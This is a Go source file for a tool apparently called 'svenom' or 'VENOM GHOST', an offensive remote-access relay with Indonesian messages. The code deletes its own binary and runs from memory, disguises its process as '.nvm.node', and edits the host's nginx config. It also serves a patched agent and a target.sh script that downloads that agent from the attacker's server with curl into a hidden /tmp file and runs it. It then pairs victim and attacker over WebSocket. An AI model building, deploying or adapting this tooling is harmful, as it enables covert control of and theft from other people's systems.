package main

import (
	"bytes"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"

	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
	"github.com/gorilla/websocket"
)

//go:embed agentbin/vghost
var agentTemplate []byte

var (
	installMode = flag.Bool("i", false, "Install relay server")
	relayMode   = flag.Bool("relay", false, "Run as relay server")
	domain      = flag.String("d", "", "Domain name (optional)")
	listenPort  = flag.String("port", "9443", "Relay port (internal, behind nginx)")
	httpPort    = flag.String("http", "8080", "HTTP port for serving agent")
	secretFlag  = flag.String("secret", "", "Secret key (required for relay mode)")
	wsPath      = flag.String("ws-path", "/ws", "WebSocket endpoint path")
)

const banner = `
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
`

func main() {
	flag.Parse()

	if *relayMode {
		if *secretFlag == "" {
			log.Fatal("Secret required for relay mode")
		}
		runRelay(*listenPort, *httpPort, *secretFlag)
		return
	}

	if *installMode {
		installServer()
		return
	}

	fmt.Println(banner)
	fmt.Println("Usage: svenom -i [-d domain.com] [-port 9443] [-http 8080]")
}

func installServer() {
	publicIP, _ := getPublicIP()
	serverDomain := *domain
	if serverDomain == "" {
		serverDomain = publicIP
	}

	secretBytes := make([]byte, 16)
	rand.Read(secretBytes)
	secret := hex.EncodeToString(secretBytes)

	absPath, _ := filepath.Abs(".")

	fmt.Println(banner)
	fmt.Println("(VENOM GHOST) ")
	fmt.Printf("IP Public Address Server : %s\n", publicIP)
	fmt.Printf("Domain Server            : %s\n", serverDomain)
	fmt.Printf("Path                     : %s\n", absPath)
	fmt.Printf("Secret Key               : %s\n", secret)
	fmt.Printf("Relay Port (internal)    : %s\n", *listenPort)
	fmt.Printf("WebSocket Path           : %s\n", *wsPath)
	fmt.Println()
	fmt.Println("Gunakan command berikut di LAPTOP ATTACKER setelah target terpasang:")
	fmt.Printf("   vghost --Sk %s -d %s --connect\n", secret, serverDomain)
	fmt.Println()

	// Auto-configure nginx
	if serverDomain != publicIP {
		configureNginx(serverDomain, *listenPort, *wsPath)
	} else {
		fmt.Println("[!] Tidak ada domain, skip auto-configure nginx.")
		fmt.Println("    Tambahkan config nginx secara manual jika diperlukan.")
		printNginxConfig(*listenPort, *wsPath)
	}

	fmt.Println("\n[*] Starting fileless relay server...")

	self, _ := os.ReadFile(os.Args[0])
	os.Remove(os.Args[0])

	args := []string{
		".nvm.node",
		"-relay",
		"-port", *listenPort,
		"-http", *httpPort,
		"-secret", secret,
		"-ws-path", *wsPath,
	}
	if err := memfd.ExecuteInMemory(self, args, os.Environ()); err != nil {
		log.Printf("memfd failed, fallback: %v", err)
		masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -port "+*listenPort)
		runRelay(*listenPort, *httpPort, secret)
	}
}

func printNginxConfig(port, path string) {
	fmt.Println("\n    # Tambahkan ke server block nginx:")
	fmt.Printf(`    location %s {
        proxy_pass http://127.0.0.1:%s;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
        proxy_buffering off;
    }
`, path, port)
}

func configureNginx(domain, port, path string) {
	fmt.Println("[*] Auto-configuring nginx...")

	// Cari nginx config file untuk domain ini
	configDirs := []string{
		"/etc/nginx/sites-enabled",
		"/etc/nginx/conf.d",
	}

	var configFile string
	for _, dir := range configDirs {
		files, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, f := range files {
			fpath := filepath.Join(dir, f.Name())
			content, err := os.ReadFile(fpath)
			if err != nil {
				continue
			}
			if strings.Contains(string(content), domain) {
				configFile = fpath
				break
			}
		}
		if configFile != "" {
			break
		}
	}

	if configFile == "" {
		fmt.Printf("[!] Tidak menemukan nginx config untuk domain %s\n", domain)
		fmt.Println("    Tambahkan config berikut secara manual:")
		printNginxConfig(port, path)
		return
	}

	fmt.Printf("[*] Ditemukan config: %s\n", configFile)

	// Cek apakah sudah ada config WebSocket
	content, _ := os.ReadFile(configFile)
	if strings.Contains(string(content), "location "+path) {
		fmt.Println("[*] WebSocket location sudah ada, skip.")
		return
	}

	// Cari posisi untuk inject: sebelum } terakhir dari server block
	lines := strings.Split(string(content), "\n")
	var newLines []string
	inserted := false

	// Cari baris terakhir yang hanya berisi "}" (penutup server block)
	for i := len(lines) - 1; i >= 0; i-- {
		if strings.TrimSpace(lines[i]) == "}" && !inserted {
			// Insert WebSocket config sebelum penutup server block
			wsConfig := fmt.Sprintf(`
    # SVENOM WebSocket Relay (auto-configured)
    location %s {
        proxy_pass http://127.0.0.1:%s;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
        proxy_buffering off;
    }`, path, port)

			newLines = append([]string{wsConfig}, newLines...)
			newLines = append([]string{lines[i]}, newLines...)
			inserted = true
			continue
		}
		newLines = append([]string{lines[i]}, newLines...)
	}

	if !inserted {
		fmt.Println("[!] Gagal menemukan posisi inject di nginx config.")
		printNginxConfig(port, path)
		return
	}

	// Write updated config
	if err := os.WriteFile(configFile, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
		fmt.Printf("[!] Gagal menulis config: %v\n", err)
		printNginxConfig(port, path)
		return
	}

	// Test nginx config
	if out, err := exec.Command("nginx", "-t").CombinedOutput(); err != nil {
		fmt.Printf("[!] Nginx config test gagal: %s\n", string(out))
		// Rollback
		os.WriteFile(configFile, content, 0644)
		fmt.Println("[!] Config di-rollback.")
		printNginxConfig(port, path)
		return
	}

	// Reload nginx
	if out, err := exec.Command("nginx", "-s", "reload").CombinedOutput(); err != nil {
		fmt.Printf("[!] Nginx reload gagal: %s\n", string(out))
	} else {
		fmt.Println("[*] Nginx config updated dan reloaded!")
	}
}

// --- WebSocket Relay ---

var wsUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

var waitingPeers = struct {
	sync.Mutex
	m map[string]chan *websocket.Conn
}{m: make(map[string]chan *websocket.Conn)}

func runRelay(listenPort, httpPort, secret string) {
	masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -port "+listenPort)

	publicIP, _ := getPublicIP()
	if publicIP == "" {
		publicIP = "127.0.0.1"
	}

	// Patch agent binary dengan secret dan domain
	placeholderSecret := []byte("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS")
	placeholderDomain := []byte("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD")
	secretPadded := fmt.Sprintf("%-32s", secret)
	domainPadded := fmt.Sprintf("%-32s", publicIP)

	patchedBinary := bytes.Replace(agentTemplate, placeholderSecret, []byte(secretPadded), 1)
	patchedBinary = bytes.Replace(patchedBinary, placeholderDomain, []byte(domainPadded), 1)

	// HTTP file server (port 8080) — serves agent binary
	fileMux := http.NewServeMux()
	fileMux.HandleFunc("/vghost", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(patchedBinary)
	})
	fileMux.HandleFunc("/target.sh", func(w http.ResponseWriter, r *http.Request) {
		script := fmt.Sprintf(`#!/bin/bash
echo "[*] Mengunduh agent..."
curl -s http://%s:%s/vghost -o /tmp/.nginx-update && chmod +x /tmp/.nginx-update
echo "[*] Menjalankan agent..."
/tmp/.nginx-update &
sleep 1
echo ""
echo "(VENOM GHOST)"
echo "IP Public Address Server : %s"
echo "Domain Server            : %s"
echo "Path                     : /tmp"
echo "Secret Key               : %s"
echo ""
echo "Command untuk Attacker : vghost --Sk %s -d %s --connect"
`, publicIP, httpPort, publicIP, publicIP, secret, secret, publicIP)
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte(script))
	})
	go http.ListenAndServe(":"+httpPort, fileMux)

	// WebSocket relay server (internal port, behind nginx)
	relayMux := http.NewServeMux()
	relayMux.HandleFunc(*wsPath, handleWS)

	relayAddr := "127.0.0.1:" + listenPort
	log.Printf("WebSocket relay listening on %s%s", relayAddr, *wsPath)
	log.Printf("HTTP file server on :%s", httpPort)

	if err := http.ListenAndServe(relayAddr, relayMux); err != nil {
		log.Fatalf("Relay listen: %v", err)
	}
}

func handleWS(w http.ResponseWriter, r *http.Request) {
	ws, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}

	// Baca secret sebagai first message
	_, msg, err := ws.ReadMessage()
	if err != nil {
		ws.Close()
		return
	}
	secret := strings.TrimSpace(string(msg))

	waitingPeers.Lock()
	if ch, ok := waitingPeers.m[secret]; ok {
		// Peer ditemukan → kirim WS kita ke peer yang menunggu
		delete(waitingPeers.m, secret)
		waitingPeers.Unlock()
		log.Printf("Paired: %s...", secret[:8])
		ch <- ws
		return
	}

	// Belum ada peer → tunggu
	ch := make(chan *websocket.Conn, 1)
	waitingPeers.m[secret] = ch
	waitingPeers.Unlock()
	log.Printf("Waiting for peer: %s...", secret[:8])

	// Tunggu peer datang atau timeout/disconnect
	peerWS := <-ch

	// Bidirectional WebSocket pipe
	wsPipe(ws, peerWS)
}

func wsPipe(ws1, ws2 *websocket.Conn) {
	errCh := make(chan error, 2)

	copyWS := func(dst, src *websocket.Conn) {
		for {
			mt, msg, err := src.ReadMessage()
			if err != nil {
				errCh <- err
				return
			}
			if err := dst.WriteMessage(mt, msg); err != nil {
				errCh <- err
				return
			}
		}
	}

	go copyWS(ws1, ws2)
	go copyWS(ws2, ws1)

	<-errCh
	ws1.Close()
	ws2.Close()
}

func getPublicIP() (string, error) {
	resp, err := http.Get("https://ifconfig.me/ip")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(body)), nil
}